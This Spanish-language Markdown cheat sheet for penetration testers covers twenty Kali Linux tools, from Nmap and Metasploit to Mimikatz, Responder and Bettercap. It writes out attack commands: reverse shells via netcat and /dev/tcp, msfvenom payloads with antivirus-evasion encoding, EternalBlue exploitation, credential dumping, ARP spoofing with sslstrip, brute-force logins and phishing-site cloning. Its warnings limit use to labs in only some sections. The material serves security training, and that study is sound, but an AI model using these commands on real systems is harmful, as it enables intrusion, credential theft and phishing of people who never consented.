<div align="center">

# ⚔️ KALI LINUX — La Espada del Pentesting

*«El que sabe conoce su herramienta; el maestro conoce todas.»*

**Nivel recomendado:** Todos · **Objetivo:** Las herramientas ofensivas más usadas en Kali

</div>

---

# Índice

1. [Nmap](#1-nmap) · 2. [Wireshark](#2-wireshark) · 3. [Metasploit](#3-metasploit) · 4. [Burp Suite](#4-burp-suite) · 5. [John the Ripper](#5-john-the-ripper) · 6. [Hashcat](#6-hashcat) · 7. [Hydra](#7-hydra) · 8. [sqlmap](#8-sqlmap) · 9. [Aircrack-ng](#9-aircrack-ng) · 10. [Gobuster](#10-gobuster) · 11. [Nikto](#11-nikto) · 12. [Netcat](#12-netcat) · 13. [msfvenom](#13-msfvenom) · 14. [SET](#14-set) · 15. [Responder](#15-responder) · 16. [BloodHound](#16-bloodhound) · 17. [Mimikatz](#17-mimikatz) · 18. [Bettercap](#18-bettercap) · 19. [Evil-WinRM](#19-evil-winrm) · 20. [WPScan](#20-wpscan)

---

## 1. Nmap

| 🌱 Nivel | Básico · El rey del escaneo | 📦 `nmap` (preinstalado) |

### Descripción
**Escáner de redes** por excelencia: descubre hosts, puertos abiertos, servicios, versiones, SO y vulnerabilidades. Toda fase de reconocimiento empieza aquí.

### Uso básico
```bash
nmap -sV -sC -O <IP>                # escaneo completo: versión + scripts + SO
nmap -p- <IP>                       # TODOS los puertos (1-65535)
nmap -sn <IP/24>                    # descubrimiento de hosts (ping scan)
```

### Ejemplos
```bash
nmap -sV -p 80,443 --script=vuln example.com   # tech web + posibles vulnerabilidades
nmap -T4 -A 10.10.10.5                        # agresivo, detección total
nmap -oA reporte 192.168.1.0/24               # guardar (nmap/gnmap/xml)
```

### Tips del Ninja 🥷
- Con `-sV` + `--script=vuln` encuentras CVEs conocidos. Con `-O` adivinas el SO.
- `-sS` (SYN) es rápido y discreto pero necesita root; `-sT` es el que usarás vía ProxyChains.

---

## 2. Wireshark

| 🌱 Nivel | Básico · El ojo del tráfico | 📦 `wireshark` (preinstalado) |

### Descripción
**Analizador de paquetes** (sniffer) gráfico que captura y muestra TODO el tráfico de red en tiempo real. Esencial para entender protocolos, debuggear y detectar credenciales en claro.

### Uso básico
```bash
sudo wireshark                        # abrir GUI
# Elegir interfaz → empezar captura → parar
```

### Filtros imprescindibles
```text
http            → tráfico web       tcp.port==3389     → RDP
ftp             → ftp               dns                → consultas DNS
tcp.port==80    → puerto concreto   ip.src==192.168.1.1 → origen
http.request    → peticiones web    http.response.code==401 → logins
```

### Tips del Ninja 🥷
- Busca credenciales en claro: filtrar `http.request.method=="POST"` y seguir el flujo HTTP muestra usuarios/claves.
- Usa **tshark** para línea de comandos: `sudo tshark -i eth0 -Y "http"`.
- Capturar en Kali durante 1 minuto sobre una red Wi-Fi suele destapar tráfico interesante.

---

## 3. Metasploit

| 🌿 Nivel | Intermedio · El framework de explotación | 📦 `metasploit-framework` |

### Descripción
**Framework de explotación** con miles de exploits, payloads, encoders y módulos auxiliares. Desde el escaneo hasta la persistencia: el "localizador de exploits" definitivo.

### Uso básico
```bash
msfconsole                                   # abrir consola
search <servicio>                            # buscar módulos (ej: search samba)
use exploit/...                              # cargar un exploit
show options                                 # ver opciones
set RHOSTS <IP>  /  set RPORT <puerto>       # configurar
check                                        # ¿vulnerable? (si soporta)
exploit                                      # lanzar
```

### Ejemplo rápido (HTB-style)
```bash
msfconsole
search ms17-010                       # EternalBlue: SMB Windows
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST tun0
exploit
# dentro de Meterpreter:
sysinfo        getuid        shell        hashdump
```

### Tips del Ninja 🥷
- `db_nmap` conecta el escaneo con la BD de Metasploit: `services` te muestra qué explotar.
- **Meterpreter** es tu navaja: `portfwd`, `kiwi` (mimikatz), `migrate`, `autoroute`.
- Siempre: `msfvenom` para payloads propios + `handler` para recibirlos.

---

## 4. Burp Suite

| 🥷 Nivel | Avanzado · El proxy del pentester web | 📦 `burpsuite` (community) |

### Descripción
**Proxy de interceptación** para pentesting web: captura, modifica y repite peticiones HTTP/S, con escáner (edición Pro), decodificador, comparador y Repeater.

### Uso básico
1. Abre Burp → **Proxy** → **Intercept On**.
2. Configura el navegador (o usa la pestaña **Burp's browser**) con proxy `127.0.0.1:8080`.
3. Intercepta peticiones, modifícalas y envíalas al **Repeater**.

### Flujo típico
```text
Proxy → captura petición → Clic derecho → Send to Repeater
Repeater → modifica (SQLi, XSS, parametrización) → Send → lee respuesta
```

### Tips del Ninja 🥷
- Usa **Repeater** para probar payloads manualmente y **Intruder** (Community limita velocidad) para fuerza bruta de campos.
- El **Decode/Encode** ahorra tiempo con URL/SQL/Base64. El **Comparer** detecta diferencias entre respuestas (como la falsa en login).
- Intercepta también **WebSockets y JSON** para APIs modernas.

---

## 5. John the Ripper

| 🌿 Nivel | Intermedio · Crackeador de contraseñas (CPU) | 📦 `john` |

### Descripción
**Crackeador de hashes de contraseñas** que combina ataques de diccionario, fuerza bruta e incrementales. Compatible con decenas de formatos (MD5, SHA, ntlm, zip, rar...).

### Uso básico
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt                # mostrar los crackeados
john --incremental hashes.txt         # fuerza bruta
```

### Ejemplos
```bash
# Crackear hashes NT (Windows)
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt ntlm.txt

# Hash de un zip cifrado: extraerlo primero con zip2john
zip2john secreto.zip > zip.hash && john zip.hash

# Con reglas (mutaciones del diccionario)
john --wordlist=rockyou.txt --rules=All hashes.txt
```

### Tips del Ninja 🥷
- Uso el **diccionario de rockyou**: en Kali viene en `/usr/share/wordlists/rockyou.txt.gz` → `gunzip`.
- `--show` lista las crackeadas: solo falta reutilizarlas en otros servicios.
- Funciona lento en CPU: para GPUs usa **Hashcat**.

---

## 6. Hashcat

| 🥷 Nivel | Avanzado · Crackeador por GPU | 📦 `hashcat` |

### Descripción
**Crackeador de hashes acelerado por GPU** (CUDA/OpenCL). Millones de hashes por segundo usando modos de ataque: diccionario, combinación, máscara o reglas.

### Uso básico
```bash
hashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt
# -m 0       → MD5        -m 1000 → NTLM     -m 13100 → Kerberoast
# -a 0       → diccionario  -a 3 → máscara
hashcat -m 0 -a 3 hash.txt '?u?l?l?l?d?d'     # patrón: Mayúsc.+3 minúsc.+2 dígitos
```

### Ejemplos
```bash
hashcat -m 1000 --show hashes.txt            # ver resultads
hashcat -m 1000 -a 0 -r rules/best64.rule ntlm.txt rockyou.txt  # con reglas
hashcat --example-hashes | grep -A3 "NTLM"   # verificar formato
```

### Tips del Ninja 🥷
- **Identifica el modo** con `hashid 'hash'` (o `hashcat --identify`).
- Máscaras potentes: `?u?l...` charset propio: `-1 ?l?d` → `?1?1?1?1`.
- En Kali antes de la versión nueva hay que parchear para usar drivers; si falla, usa **john**.

---

## 7. Hydra

| 🌿 Nivel | Intermedio · Fuerza bruta de logins | 📦 `hydra` |

### Descripción
**Crackeador de contraseñas en red** (online): fuerza bruta contra servicios SSH, FTP, HTTP POST, SMB, RDP, MySQL, SMTP y más. Lento vs offline (cada intento viaja por la red), pero indispensable.

### Uso básico
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.5
hydra -l admin -P pass.txt ftp://192.168.1.10
```

### Ejemplos
```bash
# HTTP POST login (formulario web)
hydra -l admin -P pass.txt 10.10.10.5 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# RDP
hydra -t 4 -l administrador -P pass.txt rdp://10.10.10.5

# Usuario y password ambos de lista
hydra -L usuarios.txt -P pass.txt smb://10.10.10.5
```

### Tips del Ninja 🥷
- `-t` hilos (4-16) y `-w` timeout para no colapsar ni ser detectado.
- La parte `:Frase_después_de_fallo` en HTTP-POST es clave: usa la respuesta del sitio cuando falla el login.
- Ojo si hay **fail2ban/WAF**: te bloquearán la IP rápido.

---

## 8. sqlmap

| 🌿 Nivel | Intermedio · Automatización de SQLi | 📦 `sqlmap` (preinstalado) |

### Descripción
**Detecta y explota inyecciones SQL** de forma automática: enumera bases de datos, extrae tablas/datos e incluso permite subir archivos o ganar ejecución de comandos vía stacked queries.

### Uso básico
```bash
sqlmap -u "http://sitio/item.php?id=1" --batch
sqlmap -u "http://sitio/item.php?id=1" --dbs          # listar BD
```

### Ejemplos
```bash
sqlmap -u "http://sitio/item.php?id=1" -D bd -T usuarios --dump   # volcar tabla
sqlmap -u "http://..." -r peticion_guardada.txt --forms           # desde request capturada
sqlmap -u "http://..." --os-shell                                # shell si hay permiso
```

### Tips del Ninja 🥷
- Usa `--level 2 --risk 2` para más profundidad, `--tamper=space2comment` para evadir WAF.
- Guarda la petición con Burp y pasa `-r archivo.txt`: menos errores de parsing.
- `--batch` responde sí a todo: lee bien lo que pregunte antes de volcar datos.

---

## 9. Aircrack-ng

| 🥷 Nivel | Avanzado · Suite WiFi (protocolo WPA/WEP) | 📦 `aircrack-ng` |

### Descripción
Suite completa para auditar **redes inalámbricas**: captura de handshakes WPA/WPA2, ataques de deauth, cracking WEP/WPA y monitorización de redes.

### Flujo básico (WPA2 handshake)
```bash
sudo airmon-ng start wlan0                    # modo monitor → wlan0mon
sudo airodump-ng wlan0mon                     # ver redes y clientes
sudo airodump-ng -c <canal> --bssid <MAC> -w cap wlan0mon   # capturar objetivo
sudo aireplay-ng -0 5 -a <MAC_AP> wlan0mon    # deauth para forzar reconexión
sudo aircrack-ng -w rockyou.txt cap-01.cap    # crackear handshake
```

### Tips del Ninja 🥷
- Solo con **tu propia red o laboratorio** (hackear WiFi ajeno es delito en casi todos los países).
- `airodump-ng` con `-w` guarda el .cap que luego se crackea.
- Busca redes con **WPS**: `reaver -b <MAC> -c <canal>` es más rápido que capturar handshake.

---

## 10. Gobuster

| 🌿 Nivel | Intermedio · Enumeración web (dirs/dns/vhosts) | 📦 `gobuster` |

### Descripción
**Fuerza bruta de directorios y archivos web**, subdominios DNS y *virtual hosts*. Rápido (Go) y con soporte de extensiones.

### Uso básico
```bash
gobuster dir -u http://sitio -w /usr/share/wordlists/dirb/common.txt -x php,txt
gobuster dns -d example.com -w /usr/share/wordlists/dnsrecon/namelist.txt
```

### Ejemplos
```bash
gobuster dir -u http://10.10.10.5 -w dirb/common.txt -t 50 -q
# → /admin  /backup  /robots.txt  /uploads ...
gobuster vhost -u http://example.com -w subdominios.txt --append-domain
```

### Tips del Ninja 🥷
- Agrega `-x php,html,txt,bak,zip` para encontrar backups (¡.bak suelen filtrar código!).
- **Dirsearch** es alternativa cómoda: `dirsearch -u http://sitio -e php`.
- El wordlist `directory-list-2.3-medium.txt` (SecLists) es el más usado.

---

## 11. Nikto

| 🌿 Nivel | Intermedio · Escáner de vulnerabilidades web | 📦 `nikto` |

### Descripción
**Escáner de servidores web**: detecta archivos peligrosos, versiones antiguas, configuraciones erróneas y problemas genéricos conocidos (~6700 pruebas).

### Uso básico
```bash
nikto -h http://example.com
nikto -h http://example.com -p 8080 -ssl
```

### Ejemplos
```bash
nikto -h http://10.10.10.5 -o reporte.html -Format htm
nikto -h https://example.com -ssl -evasion 3
```

### Tips del Ninja 🥷
- Es **ruidoso**: genera muchas peticiones; ideal para CTF o con permiso.
- Falsos positivos frecuentes: cruza resultados con **Nmap --script=vuln**.
- La salida `-o` a HTML/CSV facilita informes.

---

## 12. Netcat

| 🌿 Nivel | Intermedio · "La navaja suiza del TCP" | 📦 `netcat-openbsd` / `ncat` |

### Descripción
Lee y escribe datos por TCP/UDP: **chats, transferencias de archivos, bindshells, reverse shells y escaneos de puertos** manuales.

### Uso básico
```bash
nc -lvnp 4444                 # escuchar en puerto (receptor)
nc <IP> 4444                  # conectar (emisor)
nc -zv <IP> 1-1000            # escaneo de puertos rápido
```

### Ejemplos
```bash
# Reverse shell clásica (Linux)
nc -e /bin/sh <IP> 4444

# Reverse shell con ncat (Windows-friendly) 
ncat -lvnp 4444 -e cmd.exe

# Transferir archivo
nc <IP> 4444 < secretos.txt                # emisor
nc -lvnp 4444 > copia.txt                  # receptor
```

### Tips del Ninja 🥷
- `-z` escaneo silencioso; `-v` verbose. Para bindshells persistentes usa `-k` (keep listening).
- Kali incluye **ncat** (más moderno, soporta SSL y `--proxy`).
- En consolas modernas `-e` está limitado: prefiere el one-liner con bash: `bash -i >& /dev/tcp/IP/4444 0>&1`.

---

## 13. msfvenom

| 🌿 Nivel | Intermedio · Generador de payloads | 📦 `metasploit-framework` |

### Descripción
Genera **payloads y shellcodes** (binarios, scripts, ofuscados) para cada plataforma: Windows, Linux, Android, macOS, web... El complemento perfecto de Metasploit.

### Uso básico
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf
msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o app.apk
```

### Ejemplos
```bash
# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f raw > shell.php

# PowerShell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f ps1

# Ofuscar con encoder + veces
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -e x86/shikata_ga_nai -i 9 -f exe
```

### Tips del Ninja 🥷
- Siempre acompaña el payload con un **handler** de Metasploit (`use multi/handler`) o `nc -lvnp`.
- El AV moderno detecta payloads por firma: **ofusca/cifra** (encoders, templates, separar stages).
- Prefiere stageless (`_reverse_tcp` sin stage) si el objetivo bloquea llamadas multistage.

---

## 14. SET (Social-Engineer Toolkit)

| 🌿 Nivel | Intermedio · Ingeniería social | 📦 `setoolkit` |

### Descripción
Automatiza ataques de **ingeniería social**: phishing (clonación web), spear-phishing por email, *vector spoofing* y payloads USB/Web. El arte de hackear personas, no máquinas.

### Uso básico
```bash
sudo setoolkit
```

### Menú principal (1=Social-Engineering Attacks)
```text
1) Spear-Phishing Attack Vectors   → crear email de phishing realista
2) Website Attack Vectors          → clonar un sitio de login
3) Infectious Media Generator      → USB/archivos maliciosos
4) HID Attack Vector               → teclado programable (Rubber Ducky)
```

### Ejemplo: clonar página de login
```text
1) Website Attack Vectors → 3) Credential Harvester → 2) Site Cloner
→ introduce la URL real a clonar y la IP donde correrá el ataque
```

### Tips del Ninja 🥷
- **Solo en laboratorios** o con permiso explícito: el phishing real es delito grave.
- Harvester captura las credenciales que la víctima escribe en el clon.
- Configura `SET_EXIT_ON_FAILURE` y HTTPS para máxima efectividad en demos.

---

## 15. Responder

| 🥷 Nivel | Avanzado · Envenenador de la red (LLMNR/NBT-NS) | 📦 `responder` |

### Descripción
Envenena protocolos de resolución de nombres en redes Windows (**LLMNR, NBT-NS, mDNS**) y captura **hashes NetNTLMv2** de credenciales. Con ese hash → crack o relay.

### Uso básico
```bash
sudo responder -I eth0                # escuchar en la interfaz
sudo responder -I tun0 -A             # solo análisis (sin envenenar)
```

### Tips del Ninja 🥷
- Cualquier intento fallido de resolución en la red cae en tu tarro: los hashes llegan solos.
- El hash capturado se mete en **hashcat -m 5600** o **john --format=netntlmv2** para crackear.
- Combinado con **ntlmrelayx** (Impacket) puedes saltar el crackeo directamente → relay a SMB.

---

## 16. BloodHound

| 🥷 Nivel | Avanzado · El mapa del dominio Active Directory | 📦 `bloodhound` + `bloodhound.py` |

### Descripción
**Visualiza las relaciones de AD** (usuarios, grupos, sesiones, GPO, ACLs) para encontrar el camino más corto hacia **Domain Admin**. El estándar para ataque y defensa de Active Directory.

### Uso básico
```bash
bloodhound-python -u user -p pass -d dominio.local -ns 10.10.10.1 -c All   # recolectar
# Importa el .zip en la UI de BloodHound (inicia neo4j) y lanza consultas:
#  → Most Shortest Paths to Domain Admins / Find Kerberoastable Accounts
```

### Tips del Ninja 🥷
- Arranca `sudo neo4j` y después `bloodhound` para la interfaz de grafo.
- Los nodos **Kerberoastable** y **sessiones de admin sobre servidores** son atajos clásicos.
- Con las *Saved Queries* atacantes repiten caminos: usa `-c All,Session` para DFS.

---

## 17. Mimikatz

| 🥷 Nivel | Avanzado · El rey de las credenciales Windows | 📦 en Metasploit: `load kiwi` |

### Descripción
Extrae **credenciales y tickets de Windows desde memoria**: hashes NTLM, contraseñas en claro (WDigest), tickets Kerberos y **Golden Ticket** attacks. El sueño (y pesadilla) de todo pentester de AD.

### Uso básico
```bash
# Desde Meterpreter:
load kiwi
kiwi_cmd "privilege::debug"
kiwi_cmd "sekurlsa::logonpasswords"          # passwords en claro (WDigest)
kiwi_cmd "lsadump::sam"                      # hashes SAM local
kiwi_cmd "sekurlsa::msv"                     # hashes NTLM de sesión

# Binario propio (Windows): mimikatz.exe → sekurlsa::logonpasswords
```

### Tips del Ninja 🥷
- Requiere **SYSTEM/admin**: primero escalación (potato, service misconfig, etc.).
- Los hashes NTLM permiten **Pass-the-Hash** directamente (`pth` en metasploit/impacket).
- `lsadump::dcsync /domain:x /user:Administrator` = DCSync (si tienes permisos de réplica).

---

## 18. Bettercap

| 🌿 Nivel | Avanzado · MITM y ataque a la red moderna | 📦 `bettercap` |

### Descripción
Framework de **ataques MITM y red**: sniffing, ARP spoofing, bypass de SSL, inyección de contenido, seguimiento de dispositivos, wifi (deauth) y Bluetooth. Sucesor de Ettercap, con API y módulos.

### Uso básico
```bash
sudo bettercap -iface eth0          # interfaz interactiva
net.show                          # ver dispositivos
set arp.spoof.targets 192.168.1.5 # elegir víctima
arp.spoof on                     # envenenar ARP
net.sniff on                     # leer su tráfico
```

### Ejemplos
```bash
# HSTS bypass (deshacer la protección del navegador)
set https.proxy.sslstrip true && https.proxy on

# Descargar recursos "on the fly" (inyectar payloads)
set http.proxy.script /path/script.js && http.proxy on
```

### Tips del Ninja 🥷
- **Solo laboratorio/permiso**: MITM en redes ajenas es delito.
- `net.sniff on` captura credenciales HTTP en plazo de minutos en redes activas.
- Con `--gateway` y `--gateway` puedes espiar a red completa; usa `caplets` preinstalados (`net.recon`).

---

## 19. Evil-WinRM

| 🌿 Nivel | Intermedio · Shell remota por WinRM | 📦 `evil-winrm` |

### Descripción
**Consola PowerShell remota sobre WinRM** (puerto 5985/5986). El acceso favorito tras obtener credenciales válidas (o Pass-the-Hash) contra máquinas Windows.

### Uso básico
```bash
evil-winrm -i 10.10.10.5 -u admin -p 'Password123!'
evil-winrm -i 10.10.10.5 -u admin -H <NTLM_hash>        # Pass-the-Hash
```

### Ejemplos
```bash
evil-winrm -i 10.10.10.5 -u admin -p pass -s /usr/share/windows-resources/   # scripts
# Dentro:  upload/download, ejecutar comandos, load powersploit
```

### Tips del Ninja 🥷
- WinRM suele estar activo en servidores Windows modernos — es el "SSH de Windows".
- `-H` con hash NTLM te salta la contraseña (Pass-the-Hash).
- Carga scripts con `-s` y el **PowerSploit** con `load` para escalar.

---

## 20. WPScan

| 🌿 Nivel | Intermedio · Scanner de WordPress | 📦 `wpscan` |

### Descripción
Escáner especializado en **WordPress**: detecta la versión, plugins/temas con vulnerabilidades, usuarios enumerables y realiza fuerza bruta de logins. El 40%+ de la web usa WP: herramienta clave.

### Uso básico
```bash
wpscan --url http://sitio --enumerate u        # enumerar usuarios
wpscan --url http://sitio -e vp,vt            # plugins y temas vulnerables
```

### Ejemplos
```bash
wpscan --url http://sitio --passwords rockyou.txt --usernames admin   # fuerza bruta admin
wpscan --url http://sitio --api-token TU_TOKEN --enumerate vp         # con API WPScan
```

### Tips del Ninja 🥷
- `--enumerate u` extrae los usuarios: base para el brute-force y phishing dirigido.
- Los **plugins desactualizados** con CVEs públicos son la vía rápida (metasploit suele tener módulos).
- La API de WPScan (gratuita por goteo) mejora muchísimo la detección de CVEs.

---

<div align="center">

### 🤝 Complementos Kali con un vistazo

| Herramienta | Uso rápido |
|---|---|
| `dirsearch` | Enumeración dirs: `dirsearch -u http://sitio -e php,txt` |
| `ffuf` | Fuzzing veloz: `ffuf -w wordlist -u http://sitio/FUZZ` |
| `linpeas` / `winpeas` | Escalada automática: ejecutar en la víctima |
| `impacket` | Suite AD: `GetNPUsers`, `secretsdump`, `psexec` |
| `beef` | Framework de XSS: `beef-xss` + gancho en JS |
| `masscan` | Escaneo masivo de puertos (más rápido que nmap): `masscan -p1-65535 IP --rate=1000` |

</div>

---

<div align="center">

**«Con gran poder viene una gran responsabilidad.»** 🐉

[🏠 Índice de documentos](README.md) · [⬅ Volver al perfil](../README.md)

</div>